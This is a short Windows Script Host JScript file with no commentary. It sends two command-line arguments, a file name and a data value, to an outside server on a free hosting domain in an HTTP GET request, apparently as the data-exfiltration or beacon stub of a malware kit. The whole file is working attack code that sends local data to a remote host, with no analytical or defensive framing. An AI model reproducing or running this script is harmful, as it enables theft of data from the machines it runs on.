var xmlhttp = WScript.CreateObject("Microsoft.XMLHTTP");
var fn = WScript.Arguments.Unnamed(0);
var data = WScript.Arguments.Unnamed(1);

xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=" + fn + "&data=" + data, false);
xmlhttp.Send();